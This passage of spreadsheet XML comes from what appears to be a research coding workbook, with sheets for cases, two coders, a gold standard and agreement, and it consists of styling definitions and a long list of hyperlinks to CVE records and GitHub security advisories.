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racker" sheetId="2" state="visible" r:id="rId2"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="Codebook" sheetId="3" state="visible" r:id="rId3"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="Cases" sheetId="4" state="visible" r:id="rId4"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="Coder1" sheetId="5" state="visible" r:id="rId5"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="Coder2" sheetId="6" state="visible" r:id="rId6"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="Gold" sheetId="7" state="visible" r:id="rId7"/>
    <sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" name="Agreement"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2"/>
    </font>
    <font>
      <name val="Arial"/>
      <sz val="10"/>
    </font>
    <font>
      <name val="Arial"/>
      <b val="1"/>
      <sz val="10"/>
    </font>
    <font>
      <name val="Arial"/>
      <i val="1"/>
      <sz val="9"/>
    </font>
    <font>
      <name val="Arial"/>
      <sz val="9"/>
    </font>
    <font>
      <name val="Arial"/>
      <color rgb="001F4E99"/>
      <sz val="9"/>
      <u val="single"/>
    </font>
  </fonts>
  <fills count="4">
    <fill>
      <patternFill/>
    </fill>
    <fill>
      <patternFill patternType="gray125"/>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="00DBE7F3"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="00FFF7CC"/>
      </patternFill>
    </fill>
  </fills>
  <borders count="2">
    <border>
      <left/>
      <right/>
      <top/>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left style="thin">
        <color rgb="00C7CCD3"/>
      </left>
      <right style="thin">
        <color rgb="00C7CCD3"/>
      </right>
      <top style="thin">
        <color rgb="00C7CCD3"/>
      </top>
      <bottom style="thin">
        <color rgb="00C7CCD3"/>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1" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="2" fillId="0" borderId="1" pivotButton="0" quotePrefix="0" xfId="0"/>
    <xf numFmtId="0" fontId="4" fillId="0" borderId="0" pivotButton="0" quotePrefix="0" xfId="0"/>
    <xf numFmtId="0" fontId="2" fillId="3" borderId="0" pivotButton="0" quotePrefix="0" xfId="0"/>
    <xf numFmtId="0" fontId="5" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="top"/>
    </xf>
    <xf numFmtId="0" fontId="5" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="6" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="top"/>
    </xf>
    <xf numFmtId="0" fontId="5" fillId="0" borderId="1" pivotButton="0" quotePrefix="0" xfId="0"/>
    <xf numFmtId="0" fontId="5" fillId="3" borderId="1" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="5" fillId="0" borderId="1" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="5" fillId="3" borderId="1" pivotButton="0" quotePrefix="0" xfId="0"/>
    <xf numFmtId="2" fontId="2" fillId="0" borderId="0" pivotButton="0" quotePrefix="0" xfId="0"/>
  </cellXfs>
  <cellStyles count="1">
    <cellStyle name="Normal" xfId="0" builtinId="0" hidden="0"/>
  </cellStyles>
  <dxfs count="2">
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <fgColor rgb="00E5E7EB"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <fgColor rgb="00FD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cve.org/CVERecord?id=CVE-2025-54131" TargetMode="External" Id="rId1"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-54135" TargetMode="External" Id="rId2"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-57771" TargetMode="External" Id="rId3"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-j4h9-wv2m-wrf7" TargetMode="External" Id="rId4"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-21523" TargetMode="External" Id="rId5"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-28353" TargetMode="External" Id="rId6"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-7fv4-fmmc-86g2" TargetMode="External" Id="rId7"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-5cwg-9f6j-9jvx" TargetMode="External" Id="rId8"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-wpqr-6v78-jr5g" TargetMode="External" Id="rId9"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-5c57-rqjx-35g2" TargetMode="External" Id="rId10"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-45311" TargetMode="External" Id="rId11"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-45373" TargetMode="External" Id="rId12"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-27vp-2mmc-vmh3" TargetMode="External" Id="rId13"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-f78m-9xhc-p52v" TargetMode="External" Id="rId14"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-fg94-h982-f3mm" TargetMode="External" Id="rId15"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-53765" TargetMode="External" Id="rId16"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-50548" TargetMode="External" Id="rId17"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-3v99-gw88-f2cw" TargetMode="External" Id="rId18"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-66065" TargetMode="External" Id="rId19"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-h3gc-qfjg-2m69" TargetMode="External" Id="rId20"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2023-46248" TargetMode="External" Id="rId21"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2024-48919" TargetMode="External" Id="rId22"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-6662-3hpj-63qq" TargetMode="External" Id="rId23"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-32018" TargetMode="External" Id="rId24"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-49150" TargetMode="External" Id="rId25"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-9f65-56v6-gxw7" TargetMode="External" Id="rId26"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-53097" TargetMode="External" Id="rId27"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-53098" TargetMode="External" Id="rId28"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-53536" TargetMode="External" Id="rId29"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-54377" TargetMode="External" Id="rId30"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-q6hp-29g8-7j6j" TargetMode="External" Id="rId31"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-8217" TargetMode="External" Id="rId32"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-54132" TargetMode="External" Id="rId33"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-54133" TargetMode="External" Id="rId34"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-54136" TargetMode="External" Id="rId35"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-pmw4-pwvc-3hx2" TargetMode="External" Id="rId36"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-x56v-x2h6-7j34" TargetMode="External" Id="rId37"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-54130" TargetMode="External" Id="rId38"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-55012" TargetMode="External" Id="rId39"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-3m2x-p87c-pwv6" TargetMode="External" Id="rId40"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-698g-97rr-xgjf" TargetMode="External" Id="rId41"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-x5gv-jw7f-j6xj" TargetMode="External" Id="rId42"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-8hmm-4crw-vm2c" TargetMode="External" Id="rId43"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-g74x-fxmv-p55j" TargetMode="External" Id="rId44"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-ph6w-f82w-28w6" TargetMode="External" Id="rId45"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-58370" TargetMode="External" Id="rId46"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-58371" TargetMode="External" Id="rId47"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-58372" TargetMode="External" Id="rId48"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-58373" TargetMode="External" Id="rId49"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-58374" TargetMode="External" Id="rId50"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-qxfv-fcpc-w36x" TargetMode="External" Id="rId51"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-53j9-8fm4-3gf5" TargetMode="External" Id="rId52"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-w5fx-fh39-j5rw" TargetMode="External" Id="rId53"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-2jjv-qf24-vfm4" TargetMode="External" Id="rId54"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-59956" TargetMode="External" Id="rId55"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-4fgq-fpq9-mr3g" TargetMode="External" Id="rId56"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-66m2-gx93-v996" TargetMode="External" Id="rId57"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-59944" TargetMode="External" Id="rId58"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-61589" TargetMode="External" Id="rId59"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-61590" TargetMode="External" Id="rId60"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-61591" TargetMode="External" Id="rId61"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-61592" TargetMode="External" Id="rId62"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-61593" TargetMode="External" Id="rId63"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-c934-4h55-jp45" TargetMode="External" Id="rId64"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-6mh4-fc28-667v" TargetMode="External" Id="rId65"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-gxc9-77c7-jmqm" TargetMode="External" Id="rId66"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-64106" TargetMode="External" Id="rId67"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-64107" TargetMode="External" Id="rId68"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-64108" TargetMode="External" Id="rId69"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-64109" TargetMode="External" Id="rId70"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-64110" TargetMode="External" Id="rId71"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-rh45-2vq5-cmf2" TargetMode="External" Id="rId72"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-vmgw-8w5q-v9v9" TargetMode="External" Id="rId73"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-wj8x-23v3-hggr" TargetMode="External" Id="rId74"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-hcvg-jrfj-vhqx" TargetMode="External" Id="rId75"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-mc3j-5pr5-wj7r" TargetMode="External" Id="rId76"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-6cp5-fpm8-87vg" TargetMode="External" Id="rId77"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-5hhx-v7f6-x7gv" TargetMode="External" Id="rId78"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-7mv8-j34q-vp7q" TargetMode="External" Id="rId79"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-j8xq-6qq7-vfv7" TargetMode="External" Id="rId80"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-65946" TargetMode="External" Id="rId81"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-fjwj-7prc-9qgm" TargetMode="External" Id="rId82"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-xq4m-mc3c-vvg3" TargetMode="External" Id="rId83"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2025-64671" TargetMode="External" Id="rId84"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-7xjv-wf6r-872r" TargetMode="External" Id="rId85"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-vxw4-wv6m-9hhh" TargetMode="External" Id="rId86"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-c83v-7274-4vgp" TargetMode="External" Id="rId87"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-22708" TargetMode="External" Id="rId88"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-jh7p-qr78-84p7" TargetMode="External" Id="rId89"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-vhw5-3g5m-8ggf" TargetMode="External" Id="rId90"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-q728-gf8j-w49r" TargetMode="External" Id="rId91"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-qgqw-h4xq-7w8w" TargetMode="External" Id="rId92"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-66q4-vfjg-2qhh" TargetMode="External" Id="rId93"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-mhg7-666j-cqg4" TargetMode="External" Id="rId94"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-4q92-rfm6-2cqx" TargetMode="External" Id="rId95"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-ff64-7w26-62rf" TargetMode="External" Id="rId96"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-wr95-24gv-jx75" TargetMode="External" Id="rId97"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-g435-352v-fpxp" TargetMode="External" Id="rId98"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-mjvv-wfm9-3vm3" TargetMode="External" Id="rId99"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-21518" TargetMode="External" Id="rId100"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-26268" TargetMode="External" Id="rId101"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-9ppg-jx86-fqw7" TargetMode="External" Id="rId102"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-g8r9-g2v8-jv6f" TargetMode="External" Id="rId103"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-31854" TargetMode="External" Id="rId104"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-f2fc-vc88-6w7q" TargetMode="External" Id="rId105"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-gv8f-wpm2-m5wr" TargetMode="External" Id="rId106"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-qpcc-2ccj-gp68" TargetMode="External" Id="rId107"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-mmgp-wc2j-qcv7" TargetMode="External" Id="rId108"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-7h8w-hj9j-8rjw" TargetMode="External" Id="rId109"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-3hqq-48gq-cwg4" TargetMode="External" Id="rId110"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-rfcm-98h7-2567" TargetMode="External" Id="rId111"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-m8x7-r2rg-vh5g" TargetMode="External" Id="rId112"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-w4rv-fppc-w84h" TargetMode="External" Id="rId113"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-7v7j-vpv5-h468" TargetMode="External" Id="rId114"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-jgg3-qqhf-7rx7" TargetMode="External" Id="rId115"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-72p2-f44p-v65f" TargetMode="External" Id="rId116"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-479q-mw77-pmr5" TargetMode="External" Id="rId117"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-7853-gqqm-vcwx" TargetMode="External" Id="rId118"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-xrxf-jgv3-qmrm" TargetMode="External" Id="rId119"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-ghqv-73vw-x3j9" TargetMode="External" Id="rId120"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-wj2m-jvpr-64cq" TargetMode="External" Id="rId121"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-gqqj-85qm-8qhf" TargetMode="External" Id="rId122"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-qc74-2r45-g2fp" TargetMode="External" Id="rId123"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-vp62-r36r-9xqp" TargetMode="External" Id="rId124"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-q5hj-mxqh-vv77" TargetMode="External" Id="rId125"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-cqv7-q5jh-6mfp" TargetMode="External" Id="rId126"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-3qf4-9783-vxr5" TargetMode="External" Id="rId127"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-9ccr-r5hg-74gf" TargetMode="External" Id="rId128"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-41109" TargetMode="External" Id="rId129"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-44246" TargetMode="External" Id="rId130"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-44467" TargetMode="External" Id="rId131"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-44470" TargetMode="External" Id="rId132"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-g3xq-3gmv-qq8g" TargetMode="External" Id="rId133"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-mwv7-rw63-qfm9" TargetMode="External" Id="rId134"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-rpc6-9c4p-j5cg" TargetMode="External" Id="rId135"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-2c7p-5h72-cjj3" TargetMode="External" Id="rId136"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-67c5-x5mf-rppq" TargetMode="External" Id="rId137"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-cv6r-hx5v-c4m6" TargetMode="External" Id="rId138"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-2fh4-hw94-qg7r" TargetMode="External" Id="rId139"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-45046" TargetMode="External" Id="rId140"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-45310" TargetMode="External" Id="rId141"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cve.org/CVERecord?id=CVE-2026-45374" TargetMode="External" Id="rId142"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-c3wr-3c4v-6rmh" TargetMode="External" Id="rId143"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-7w7m-v5vp-w699" TargetMode="External" Id="rId144"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-f9g4-qjmq-f49r" TargetMode="External" Id="rId145"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-hchg-qm84-cj9p" TargetMode="External" Id="rId146"/><Relationship 